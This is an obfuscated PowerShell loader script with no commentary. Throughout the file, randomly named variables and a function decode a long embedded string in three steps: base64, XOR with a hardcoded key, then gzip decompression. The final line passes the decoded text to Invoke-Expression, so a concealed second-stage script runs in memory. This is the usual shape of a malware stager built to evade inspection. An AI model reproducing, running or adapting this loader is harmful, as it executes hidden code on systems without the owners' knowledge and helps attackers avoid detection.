$581gvfr20wuh3lt = [System.Text.Encoding]::ascii
function ns4x9r5lzfotj7v1gkwua0cq386  {param($pwd270rmuc65yot )
  $o53xzmda0u19q6n = [System.Convert]::FromBase64String($pwd270rmuc65yot)
  $waj261l7ymtk9or= $581gvfr20wuh3lt.GetBytes("rtczl9e215sy")
    $qwhiyzu04lc3rpv = $o53xzmda0u19q6n
    $fhq596dzyxprnuc = $(for ($n62krqdytwj1caf = 0; $n62krqdytwj1caf -lt $qwhiyzu04lc3rpv.length; ) {
        for ($a5owv6zylep7480 = 0; $a5owv6zylep7480 -lt $waj261l7ymtk9or.length; $a5owv6zylep7480++) {
            $qwhiyzu04lc3rpv[$n62krqdytwj1caf] -bxor $waj261l7ymtk9or[$a5owv6zylep7480]
            $n62krqdytwj1caf++
            if ($n62krqdytwj1caf -ge $qwhiyzu04lc3rpv.Length) {
                $a5owv6zylep7480 = $waj261l7ymtk9or.length
            }
        }
    })
	$z5kb8dphi2weoaj = New-Object System.IO.MemoryStream( , $fhq596dzyxprnuc )

	    $ktb8wf4dxqoranz = New-Object System.IO.MemoryStream
        $9fnwo7pie3ya1zk = New-Object System.IO.Compression.GzipStream $z5kb8dphi2weoaj, ([IO.Compression.CompressionMode]::Decompress)
	    $9fnwo7pie3ya1zk.CopyTo( $ktb8wf4dxqoranz )
        $9fnwo7pie3ya1zk.Close()
		$z5kb8dphi2weoaj.Close()
		[byte[]] $asp4e71twvi32dm = $ktb8wf4dxqoranz.ToArray()
 $rlmkbn179czi5w0=$asp4e71twvi32dm
    return $rlmkbn179czi5w0
}
[byte[]]$nokpi9170vut36r=ns4x9r5lzfotj7v1gkwua0cq386 $7dwpq5got1k8s0u
[System.Text.Encoding]::ascii.GetString((ns4x9r5lzfotj7v1gkwua0cq386 "bf9remw5ZTI1Nf4sHxvAQnzHGXrNMnicJgY6agXrEembKuFVH8e0jpYruNxsgynAkvR4ysUIRIamyg26OabnlutbbNPAzeoe7G14Lz1YqSDXfblg+ClZAc6w/hLFk1lx7HxoZoY0G+Zoi/VXxOaVsye2GHC8pTvmybmx0X1aSsMMub2ohlXoX2X0bGt75hV3BV2QZCN2FN5hXy1rS7xH8xkUxdz9xuxho+5a/3C8q6Jv1FH6zlTuvPPkqW1Z+Pk1Y94ln08YepYxvs2PaQbVWi67orfR1HO+1qPOJobRqBjw4OkakVGWE5qjPe/x3PsRg4XvjcwSJRgj+rQkch6LSUJ5Z+QKqfhuReeKCbf4VmqA+6Pnp3yHZHcKRf6iy2oT0FmqMDhFoeF02kZyOgC/hwBszUdatCksAfc1jQaME8JOkLjNvINyYyNyRYA3qqU4bR/jz5GUs9xL5F8C6AwHJf/SR7kM8zbpDyUJs4PXPI9+nrwso8l4iToMWuik3l4sTRjcf/2wBSlhYCrQyZMWvg6w5nJk67n8nyWh0iZ6BdT/+wYdTgep6sJirrxUr4NHG9Z1qP2MiYTCzCIGT5t2iQ+hmrWxnQJ2ekgnvPweKZDHFHGCnZwOkJRhWQRPm+nRItVS8dzNtIvnFR8I+Nerv37GTdFan2G3L36WVfBHTs6stWFfa3qqgy3TlmovgX01wFBk0E5xrSX1ldNZWJRFjJTPoi1XIcTy33X2asv5P3VZXJVS/8AfQ3mJtPoglPyBTtZElw9S9Pp/eieUEjob31NpGrIt1CHpMnJ6zRU3PyxxdrWmSjyrZGoLs8d1zKq3x1p3DbATWMr3mxg1wPxDeasIbK2zORosNfid+EcR6Ta4VlvbCzVgaHsSv6ubeRjSjaYLfGLpXcRjP5+xe4shfx0dcqtv54/9WFHXXGyZCNt7srHhuSh6MbEC4ovnL4vFpTVIQepBtfLeCnCUmQSnvAHyf+3oal1+r//ohKSDK6/6HpzmnbdYodVE+73KqwYUras62ZfBnqemyxpGqUOVunbONpVKBmskGJuUw8Z9WRcTwzppUjIxGWiNCze+1SW3RGFjbDy4flK0AQhgI3VHZx48IO8lU6B4SW3vou727MMckZCTFeZo4CQbbwIi03JtdwnA1h/BdtALlQZsG1xr7DyN28KjJVPWW4Cz1a/dxgqhgU/8FdGKBcVvM2xiMnN5"))|iex;